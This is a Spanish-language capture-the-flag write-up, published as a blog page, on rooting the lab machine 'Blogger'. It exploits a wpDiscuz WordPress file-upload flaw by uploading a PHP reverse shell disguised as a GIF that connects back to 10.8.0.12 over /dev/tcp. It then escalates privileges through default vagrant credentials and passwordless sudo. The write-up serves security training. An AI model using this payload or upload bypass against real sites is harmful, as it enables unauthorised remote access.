@@ -1,0 +1,676 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Blogger - Hack Journey - ewor01      Ciberseguridad y Hacking Ético      </title>
+<meta name="description" content="Blogger es una máquina donde estaremos explotando una vulnerabilidad en el gestor de contenido wordpress con la que vamos a lograr acceso al servidor, posteriormente para escalar privilegios tendremos que hacer unos movimientos laterales para cambiar de usuario y obtener el root de la máquina.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="ewor01 | Ciberseguridad y Hacking Ético">
+<meta property="og:title" content="Blogger - Hack Journey">
+<meta property="og:url" content="http://localhost:4000/blogger-hackjourney/">
+
+
+  <meta property="og:description" content="Blogger es una máquina donde estaremos explotando una vulnerabilidad en el gestor de contenido wordpress con la que vamos a lograr acceso al servidor, posteriormente para escalar privilegios tendremos que hacer unos movimientos laterales para cambiar de usuario y obtener el root de la máquina.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/hj-writeup-blogger/blogger.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-10-16T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/blogger-hackjourney/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "ewor01",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="ewor01 | Ciberseguridad y Hacking Ético Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Blogger - Hack Journey</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="ewor01" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">ewor01</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Ingeniero en ciencias de la computación / Ethical hacker / Pentesting / Ciberseguridad / CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Honduras</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/ewor01" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/edwin-josu%C3%A9-romero-perez-306140224" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/ewor01" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        
+          <li>
+            <a href="https://www.youtube.com/channel/UCKn3LZ1cc2V94tngdzvn0eA" itemprop="sameAs" rel="nofollow noopener noreferrer">
+              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Blogger - Hack Journey">
+    <meta itemprop="description" content="Blogger es una máquina donde estaremos explotando una vulnerabilidad en el gestor de contenido wordpress con la que vamos a lograr acceso al servidor, posteriormente para escalar privilegios tendremos que hacer unos movimientos laterales para cambiar de usuario y obtener el root de la máquina.">
+    <meta itemprop="datePublished" content="October 16, 2024">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Blogger - Hack Journey
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-10-16T00:00:00-06:00">October 16, 2024 </time>&emsp;
+          
+          
+        </p>
+        <p>Dificultad: Fácil</p>
+
+<p>Habilidades:</p>
+
+<ul>
+  <li>Fuzzing</li>
+  <li>Information Leakage</li>
+  <li>CMS Exploitation (Wordpress)</li>
+  <li>PHP Reverse Shell (Bypass upload file with GIF)</li>
+  <li>Lateral Movement</li>
+</ul>
+
+<p><img src="/assets/images/hj-writeup-blogger/blogger.png" alt="Captura de pantalla (62).png" /></p>
+
+<h1 id="ip-de-la-maquina">IP de la Maquina</h1>
+
+<p>10.10.0.5</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+
+<p>Comprobando conectividad con la maquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 10.10.0.5
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/ping.png" alt="ping.png" /></p>
+
+<p>Identificando el sistema operativo lo realizamos con un script en python que en base al TTL nos dice ante que SO nos encontramos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wichSystem.py
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/SO.png" alt="SO.png" /></p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Escaneo de los puertos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> scanP 10.10.0.5
+
+<span class="c"># sudo Privilegios de administrador</span>
+<span class="c"># -p- Para que escanee todo el rango de puertos disponible (65,535)</span>
+<span class="c"># --open Solo muestre los puertos abiertos (no filtrados ni cerrados)</span>
+<span class="c"># -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)</span>
+<span class="c"># --min-rate 5000 Agilizar escaneo</span>
+<span class="c"># -vvv Nos reporte por consola a medida nos vaya descubriendo cosas</span>
+<span class="c"># -n Para que no aplique resolucion DNS (ralentiza el escaneo)</span>
+<span class="c"># -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/scanP.png" alt="scanP.png" /></p>
+
+<p>Vamos a utilizar una serie de scripts básicos de reconocimiento de nmap, detectar las versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito scanS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> scanS 10.10.0.5
+
+<span class="c"># -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios</span>
+<span class="c"># -p Indicamos los puertos</span>
+<span class="c"># -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) </span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/scanS.png" alt="scanS.png" /></p>
+
+<p>Como únicamente tenemos 2 puertos abiertos, uno es el 22 donde corre el servicio SSH para el cual no tenemos credenciales, Inspeccionando la web un poco, viendo el Código fuente, no logramos encontrar nada relevante.</p>
+
+<p>Usando Wappalyzer  el cual es un Pluggin del navegador, podemos ver las tecnologías con las que esta hecha una web de igual manera con whatweb es lo mismo pero a nivel de consola. No encontramos nada relevante.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/wappalyzer.png" alt="wappalyzer.png" /></p>
+
+<p>Whatweb</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.0.5
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/whatweb.png" alt="whatweb.png" /></p>
+
+<p>Pasamos a lo siguiente, realizar fuzzing sobre la pagina para lograr encontrar directorios ocultos.</p>
+
+<p>Usaremos ffuf para realizar el fuzzing</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-ic</span> <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">-fc</span><span class="o">=</span>404 <span class="nt">-r</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.0.5/FUZZ
+
+<span class="c"># -ic Para ocultar comentarios de los diccionarios</span>
+<span class="c"># -c Formato colorizado</span>
+<span class="c"># -t Cantidad de hilos </span>
+<span class="c"># -fc Para filtrar (que no nos muestre ese resultado)</span>
+<span class="c"># -r Para que siga las redirecciones</span>
+<span class="c"># -w Indicar el diccionario  </span>
+<span class="c"># -u Indicamos la url</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/fuzzing.png" alt="fuzzing.png" /></p>
+
+<p>Gracias al fuzzing encontramos algunos directorios, inspeccionando los directorios, nos encontramos con algo interesante en assets/fonts.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/fuzzing_2.png" alt="fuzzing 2.png" /></p>
+
+<p>Revisando el directorio encontramos un tipo de blog que al parecer esta hecho en wordpress, pero no tenemos acceso, revisando un poco mas nos encontramos con un subdominio. Tenemos que agregarlo al /etc/hosts para que podamos acceder.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/VirtualHosting.png" alt="VirtualHosting.png" /></p>
+
+<p>Una vez agregado el subdominio visitamos la web, vemos que esta hecho en wodrpess y analizamos nuevamente con wappalyzer para comprobarlo.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/wordpress.png" alt="wordpress.png" /></p>
+
+<p>En efecto esta construida con wordpress, ahora que estamos ante un CMS podemos utilizar distintas herramientas para comprobar la seguridad de esta, en este caso usaremos wpscan. Realizando varias pruebas no logramos mediante escaneo pasivo encontrar información sobre pluggins vulnerables pero al cambiar a modo agresivo si logramos identificar varias vulnerabilidades para un plugin en concreto (wpDiscuz), y también identificamos un nombre de usuario j@m3s.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.0.5/assets/fonts/blog/ <span class="nt">-e</span> vp,u <span class="nt">--plugins-detection</span> aggressive <span class="nt">--api-token</span>
+
+<span class="c"># --url Indicamos la url</span>
+<span class="c"># -e vp Para que nos detecte pluggins vulnerables y u para que nos identifique posibles usuarios </span>
+<span class="c"># --plugins-detection Cambiar el modo de deteccion de los pluggins, en este caso usamos el agresivo</span>
+<span class="c"># --api-token le pasamos la API de wpscan ya que sin esta limita la busqueda de info </span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/wpdiscuz.png" alt="wpdiscuz.png" /></p>
+
+<h1 id="explotación">Explotación</h1>
+
+<p>Nos encontramos varias vulnerabilidades, realizando varias pruebas la que me funciono fue Unauthenticated Arbitrary File Upload, mediante el sistema de comentarios de un post subir una reverse shell haciendo bypassing de el campo de imágenes, subiendo la revshell como GIF.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/uploadfile.png" alt="uploadfile.png" /></p>
+
+<p>Contenido de la revshell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GIF89a<span class="p">;</span>
+&lt;?php
+<span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.0.12/1234 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span> ?&gt;
+
+<span class="c">#Agregamos la primer linea para que la interprete como GIF</span>
+</code></pre></div></div>
+
+<p>Ahora solo necesitamos ingresar a la ruta donde se almacena la revshell, para hacerlo simplemente hacemos clic sobre el archivo, y nos ponemos en escucha con netcat.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/revshell_upload.png" alt="revshell upload.png" /></p>
+
+<p>Nos ponemos en escucha</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 1234
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/nc.png" alt="nc.png" /></p>
+
+<p>Una vez hecho sucede la magia y conseguimos acceso a la maquina como el usuario www-data</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/access.png" alt="access.png" /></p>
+
+<p>Realizamos un tratamiento de la TTY para poder tener una shell estable y full interactiva.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script <span class="nt">-c</span> bash /dev/null
+ctrl + z
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> <span class="o">(</span>para traer el proceso de nuevo<span class="o">)</span>
+reset xterm
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+
+<span class="c">#Le damos las proporciones adecuadas en mi caso 37 filas y 184 columnas</span>
+<span class="nb">stty </span>rows 37 columns 184
+
+<span class="c">#Listo con esto ya tenemos una shell totalmente interactiva</span>
+
+</code></pre></div></div>
+
+<p>Realizamos un cat al /etc/passwd para ver que usuarios tenemos disponibles</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd
+</code></pre></div></div>
+
+<p><img src="/assets/images/hj-writeup-blogger/passwd.png" alt="passwd.png" /></p>
+
+<p>Visualizamos los home de cada usuario ya que podemos entrar y dentro de James encontramos el user.txt pero no tenemos permisos para visualizar el archivo.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/user_denied.png" alt="user denied.png" /></p>
+
+<p>Ahora nos queda realizar escalada de privilegios mediante movimiento lateral intentando cambiar de usuario.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
+
+<p>Como observamos tenemos usuarios con nombres por defecto así que probamos credenciales por defecto. y logramos acceder como el usuario vagrant con su pass vagrant.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/vagrant_user.png" alt="vagrant user.png" /></p>
+
+<p>Ahora comprobamos una serie de comandos para ver de que forma podemos elevar nuestros privilegios. vemos que con el comando sudo -l podemos ejecutar cualquier comando sin proporcionar contraseña.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/sudo_-l.png" alt="sudo -l.png" /></p>
+
+<p>Cambiamos al usuario James para ver el user.txt</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/usertxt.png" alt="usertxt.png" /></p>
+
+<p>Nos encontramos con un archivo que si observamos bien esta codificado en base64. Lo copiamos en nuestra maquina y vemos que contiene el archivo.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/base64_decode.png" alt="base64 decode.png" /></p>
+
+<p>Nos encontramos con la flag de la maquina, para ganar privilegios máximos, recordemos que con el usuario vagrant podemos ejecutar cualquier comando sin proporcionar la contraseña. Solo ejecutamos sudo root y ganamos privilegios totales sobre la maquina.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/root.png" alt="root.png" /></p>
+
+<p>Ya con esto hemos completado la maquina. ¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!</p>
+
+<p>Para agregar como extra si con el usuario vagrant visualizábamos las tareas cron nos encontramos una tarea aparte de las que son por defecto. A l visualizarla vemos que ejecuta un script el usuario root. Intentamos ver el script y logramos hacerlo, el script hace un comprimido del home del usuario james y lo almacena en el directorio /tmp, probamos descomprimir y lo hacemos sin problema, de esta manera también podemos obtener la flag ya que nos muestra el base64.</p>
+
+<p><img src="/assets/images/hj-writeup-blogger/cat_crontab.png" alt="cat crontab.png" /></p>
+
+<p><img src="/assets/images/hj-writeup-blogger/vagratnt_base64.png" alt="vagratnt base64.png" /></p>
+
+<p>Y esta seria otra forma de obtener la flag, solo como dato curioso. Nos vemos</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cms-exploitation-wordpress" class="page__taxonomy-item" rel="tag">CMS Exploitation (Wordpress)</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#fuzzing" class="page__taxonomy-item" rel="tag">Fuzzing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#information-leakage" class="page__taxonomy-item" rel="tag">Information Leakage</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#lateral-movement" class="page__taxonomy-item" rel="tag">Lateral Movement</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php-reverse-shell-bypass-upload-file-with-gif" class="page__taxonomy-item" rel="tag">PHP Reverse Shell (Bypass upload file with GIF)</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#f%C3%A1cil" class="page__taxonomy-item" rel="tag">Fácil</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hackjourney" class="page__taxonomy-item" rel="tag">hackjourney</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#wordpress" class="page__taxonomy-item" rel="tag">Wordpress</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2024-10-16T00:00:00-06:00">October 16, 2024</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/entorno-personalizado/" class="pagination--pager" title="Personalización de Entorno en Kali Linux para Pentesting
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 ewor01</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
